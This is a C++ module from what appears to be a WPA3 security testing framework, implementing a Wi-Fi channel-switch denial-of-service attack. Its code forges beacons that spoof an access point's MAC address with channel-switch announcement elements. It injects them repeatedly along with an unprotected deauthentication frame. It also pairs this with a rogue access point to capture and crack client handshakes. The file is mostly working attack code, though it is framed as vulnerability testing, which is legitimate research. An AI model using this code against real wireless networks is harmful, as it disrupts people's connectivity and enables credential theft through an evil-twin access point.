#include "attacks/DoS_soft/channel_switch/channel_switch.h"
#include <algorithm>
#include <cassert>
#include <chrono>
#include <filesystem>
#include <nlohmann/json.hpp>
#include <optional>
#include "system/netlink_guards.h"
#include "attacks/DoS_soft/deauth/deauth.h"
#include "attacks/components/setup_connections.h"
#include "ex_program/external_actors/ExternalConn.h"
#include "ex_program/hostapd/hostapd_helper.h"
#include "interrupt.h"
#include "logger/error_log.h"
#include "logger/log_util.h"
#include "logger/report.h"
#include "observer/observers.h"
#include "observer/tshark_wrapper.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "net_parser/channel_defs.h"
#include "net_parser/dot11_defs.h"
#include "net_parser/radiotap_defs.h"
#include "scan/active/scan_AP.h"
#include "system/hw_capabilities.h"
#include "visual/result_helper.h"
namespace wpa3_tester::CSA_attack {
using namespace std;
using namespace filesystem;
using namespace Tins;
using namespace chrono;
using namespace observer::tshark;
static void patch_ies(frame_raw_t &raw, const Channel &ap_channel) {
	patch_ds_param_in_frame(raw, ap_channel.ch_num);
	patch_ht_operation_in_frame(raw, ap_channel.ch_num);
	patch_vht_center_in_frame(raw, dot11::vht_center_ch(ap_channel.ch_num));
	const size_t ie_start = radiotap::get_rt_len(raw) + dot11::MGMT_HDR_SIZE + dot11::BEACON_FIXED;
	if(ie_start >= raw.size()) return;
	struct IESpan { uint8_t tag, len; vector<uint8_t> data; };
	vector<IESpan> ies;
	for(size_t i = ie_start; i + 1 < raw.size();) {
		const uint8_t tag = raw[i], len = raw[i + 1];
		if(i + dot11::IE_HDR_SIZE + len > raw.size()) break;
		ies.push_back({tag, len, {raw.begin() + i + dot11::IE_HDR_SIZE, raw.begin() + i + dot11::IE_HDR_SIZE + len}});
		i += dot11::IE_HDR_SIZE + len;
	}
	// keep only whitelisted IEs
	erase_if(ies, [](const IESpan &ie) {
		static constexpr array kept_ids = {
			dot11::IE_SSID, dot11::IE_RATES, dot11::IE_DS_PARAM_SET, dot11::IE_TIM,
			dot11::IE_COUNTRY, dot11::IE_CSA, dot11::IE_ECSA, dot11::IE_ERP_INFO,
			dot11::IE_HT_CAPS, dot11::IE_HT_OPERATION, dot11::IE_VHT_CAPS, dot11::IE_VHT_OPERATION,
			dot11::IE_RSN, dot11::IE_EXT_RATES, dot11::IE_SUPPORTED_OP_CLASSES,
			dot11::IE_EXTENDED_CAPS, dot11::IE_VENDOR_SPECIFIC,
		};
		if(ranges::find(kept_ids, static_cast<dot11::IE>(ie.tag)) == kept_ids.end()) return true;
		// filter VENDOR_SPECIFIC to MS OUI type 1 (WPA) and type 2 (WMM/WME)
		if(ie.tag == dot11::IE_VENDOR_SPECIFIC) {
			if(ie.data.size() < dot11::VENDOR_SPECIFIC_OUI_TYPE_MIN) return true;
			if(!equal(dot11::MS_OUI.begin(), dot11::MS_OUI.end(), ie.data.begin())) return true;
			const uint8_t type = ie.data[dot11::VENDOR_SPECIFIC_TYPE_OFF];
			return type != dot11::MS_OUI_TYPE_WPA && type != dot11::MS_OUI_TYPE_WMM;
		}
		return false;
	});
	ranges::sort(ies, [](const auto &a, const auto &b) { return a.tag < b.tag; });
	raw.erase(raw.begin() + static_cast<ptrdiff_t>(ie_start), raw.end());
	for(const auto &ie : ies) {
		raw.push_back(ie.tag);
		raw.push_back(ie.len);
		raw.insert(raw.end(), ie.data.begin(), ie.data.end());
	}
}
frame_raw_t get_CSA_beacon(const HWAddress<6> &ap_mac, const Channel &ap_channel, const Channel &new_channel,
	const int switch_count, const frame_raw_t *src_raw) {
	static const auto make_minimal = [] {
		frame_raw_t b(dot11::MGMT_HDR_SIZE + dot11::BEACON_FIXED, 0);
		b[dot11::FC_OFFSET] = static_cast<uint8_t>(dot11::MGMT_BEACON << dot11::FC_SUBTYPE_SHIFT);
		return b;
	};
	frame_raw_t raw = ensure_radiotap(src_raw ? *src_raw : make_minimal());
	const size_t hdr = radiotap::get_rt_len(raw);
	fill_n(raw.begin() + static_cast<ptrdiff_t>(hdr + dot11::ADDR1_OFFSET), dot11::MAC_ADDRESS_SIZE, uint8_t{0xFF});
	ranges::copy(ap_mac, raw.begin() + static_cast<ptrdiff_t>(hdr + dot11::ADDR2_OFFSET));
	ranges::copy(ap_mac, raw.begin() + static_cast<ptrdiff_t>(hdr + dot11::ADDR3_OFFSET));
	// CSA IE: mode=1, new_channel, switch_count
	dot11::push_ie(raw, dot11::IE_CSA,  array<uint8_t, 3>{1, new_channel.ch_num, static_cast<uint8_t>(switch_count)});
	// ECSA IE: mode=1, operating_class, new_channel, switch_count (required for 5 GHz)
	dot11::push_ie(raw, dot11::IE_ECSA, array<uint8_t, 4>{1, dot11::get_operating_class(new_channel), new_channel.ch_num, static_cast<uint8_t>(switch_count)});
	patch_ies(raw, ap_channel);
	return raw;
}
vector<frame_raw_t> get_CSA_frames(const HWAddress<6> &ap_mac, const Channel &ap_channel,
	const Channel &new_channel, const unique_ptr<Dot11Beacon> &beacon, const HWAddress<6> &sta_mac,
	const bool add_deauth) {
	vector<frame_raw_t> frames;
	const frame_raw_t src_raw = beacon ? beacon->serialize() : frame_raw_t{};
	const frame_raw_t *src_ptr = beacon ? &src_raw : nullptr;
	for(int c = CHANNEL_SWITCH_MAX; c >= 0; --c)
		frames.push_back(get_CSA_beacon(ap_mac, ap_channel, new_channel, c, src_ptr));
	// after switch_count=0: inject unprotected Deauth
	if(add_deauth) frames.push_back(deauth_attack::make_deauth(ap_mac, sta_mac).serialize());
	return frames;
}
void update_time_CSA_frames(vector<frame_raw_t> &frames) {
	const uint64_t ts = duration_cast<microseconds>(steady_clock::now().time_since_epoch()).count();
	for(auto &raw : frames) {
		const uint16_t rt_len = radiotap::get_rt_len(raw);
		if(rt_len >= raw.size()) continue;
		const uint8_t fc0 = raw[rt_len];
		if((fc0 >> dot11::FC_TYPE_SHIFT    & dot11::FC_TYPE_MASK)    != dot11::TYPE_MGMT)   continue;
		if((fc0 >> dot11::FC_SUBTYPE_SHIFT & dot11::FC_SUBTYPE_MASK) != dot11::MGMT_BEACON) continue;
		const size_t ts_off = rt_len + dot11::MGMT_HDR_SIZE;
		if(ts_off + sizeof(uint64_t) > raw.size()) continue;
		for(size_t i = 0; i < sizeof(uint64_t); ++i)
			raw[ts_off + i] = static_cast<uint8_t>(ts >> (8 * i));
	}
}
static void send_CSA_frames(PacketSender &sender, vector<frame_raw_t> &frames) {
	update_time_CSA_frames(frames);
	for(const auto &raw : frames) {
		RadioTap rt(raw.data(), raw.size());
		sender.send(rt);
	}
}
void check_vulnerable(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, const string &iface_name,
	const string &ssid, const Channel &ap_channel, const Channel &new_channel, const int ms_interval,
	const int attack_time, const int RSN_scan_timeout_sec , const optional<string> &netns) {
	netlink_helper::NetNSContext ns_ctx(netns);
	PacketSender sender{ iface_name };
	const auto end_time = steady_clock::now() + seconds(attack_time);
	const unique_ptr<Dot11Beacon> beacon =
		scan::RSN_scan(iface_name, RSN_scan_timeout_sec, ap_mac, nullopt, netns);
	if(!beacon) throw run_err("Not found beacon for reproduce");
	log(LogLevel::INFO,
		"check_vulnerable called with:\n"
		"AP MAC: {}\n"
		"STA MAC: {}\n"
		"Interface: {}\n"
		"Channel: {}\n"
		"SSID: {}\n",
		ap_mac,
		sta_mac,
		iface_name,
		ap_channel.ch_num,
		ssid);
	vector<frame_raw_t> frames = get_CSA_frames(ap_mac, ap_channel, new_channel, beacon, sta_mac, true);
	while(steady_clock::now() < end_time) {
		send_CSA_frames(sender, frames);
		interruptible_sleep(milliseconds(ms_interval));
	}
}
// ----------------- MODULE functions ------------------
void setup_chs_attack(RunStatus &rs) {
	// only setup if can
	components::client_ap_setup(rs, false);
	components::setup_rogue_ap(rs);
}
void run_attack(RunStatus &rs) {
	const auto &att_cfg = rs.config().at("attack_config");
	const auto &ap = rs.get_actor("ap");
	const HWAddress<6> ap_mac(rs.get_actor("ap").get(SK::permanent_mac));
	const HWAddress<6> sta_mac(rs.get_actor("client").get(SK::mac));
	const string iface_name = rs.get_actor("attacker").get(SK::iface);
	const optional<string> netns = rs.get_actor("attacker")[SK::netns];
	const string essid = ap.get(SK::ssid);
	const Channel old_channel = ap->get_channel();
	const Channel new_channel{ att_cfg.at("new_channel").get<uint8_t>(), ap->get_channel().band, ap[SK::ht_mode] };
	const int ms_interval = att_cfg.at("ms_interval");
	const int attack_time = att_cfg.at("attack_time");
	rs.start_observers();
	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
	rs.process_manager.write_log_all(ATTACK_START_tag);
	check_vulnerable(ap_mac, sta_mac, iface_name, essid, old_channel, new_channel, ms_interval, attack_time, att_cfg.at("RSN_scan_timeout_sec") ,netns);
	rs.process_manager.write_log_all(ATTACK_STOP_tag);
	interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));
	ap->disconnect();
	rs.process_manager.stop_all();
}
void generate_report(const RunStatus &rs, const vector<unique_ptr<GraphElements>> &elements,
	const optional<hostapd::CrackResult> &crack_result) {
	report::ReportGuard report(rs.run_folder());
	if(!report) return;
	report << "# CSA DoS Attack\n\n";
	report::attack_config_table(report, rs);
	report::attack_mapping_table(report, rs);
	const path STA_graph_path = tshark_graph(rs, "client", elements);
	if(!STA_graph_path.empty()) {
		report << "### STA (client, wpa_supplicant " << hostapd::get_version(rs, "client") << ")\n";
		report << "![STA Throughput Graph](" << STA_graph_path << ")\n\n";
	}
	const path AP_graph_path = tshark_graph(rs, "ap", elements, observer::get_observer_folder(rs, "tcpdump"));
	if(!AP_graph_path.empty()) {
		report << "### AP (ap, hostapd " << hostapd::get_version(rs, "ap") << ")\n";
		report << "![AP Graph](" << AP_graph_path << ")\n\n";
	}
	const path ATT_graph_path = tshark_graph(rs, "attacker", elements);
	if(!ATT_graph_path.empty()) {
		report << "### ATT (att)\n";
		report << "![ATT Grap(" << ATT_graph_path << ")\n\n";
	}
	const path rogue_graph_path = tshark_graph(rs, "rogue_ap", elements);
	if(!rogue_graph_path.empty()) {
		report << "###  Rogue AP (rogue_ap)\n";
		report << "![Rogue AP Graph](" << rogue_graph_path << ")\n\n";
	}
	if(crack_result.has_value()) {
		report << "## Credential Cracking \n";
		report << "Each captured handshake was verified against the known PSK\n\n";
		report << "| Metric | Value |\n|--------|-------|\n";
		report << "| Captured handshakes | " << crack_result->total << " |\n";
		report << "| Successfully cracked | " << crack_result->cracked << " |\n\n";
	}
	report << "---\n";
}
void stats_attack(const RunStatus &rs) {
	const string client_mac = rs.get_actor("client").get(SK::mac);
	vector<unique_ptr<GraphElements>> elements;
	rs.log_events(elements, { DISCONNECT, CONNECT, TESTER_TAGS });
	rs.log_events(elements, { { "client", "CTRL-EVENT-STARTED-CHANNEL-SWITCH", "SWITCH", "blue" } });
	pcap_events(rs,
		elements,
		{ { "attacker", "wlan.fc.type_subtype == 0x000c && wlan.sa == " + client_mac, "DISCONNECTED_att", "red" },
			{ "attacker", "wlan.fc.type_subtype == 0x04 && wlan.sa == " + client_mac, "client PROBE", "black" },
			{ "rogue_ap", "wlan.fc.type_subtype == 0x04 && wlan.sa == " + client_mac, "client PROBE", "blue" } });
	auto [rogue_ap_connected, crack_result] = visual::helper::hostapd_mana_crack(rs, elements);
	generate_report(rs, elements, crack_result);
	nlohmann::json result{};
	result["rogue_ap_connected"] = rogue_ap_connected;
	if(crack_result) { result["cracked"] = crack_result.value().cracked != 0; }
	rs.save_result(result);
}
}
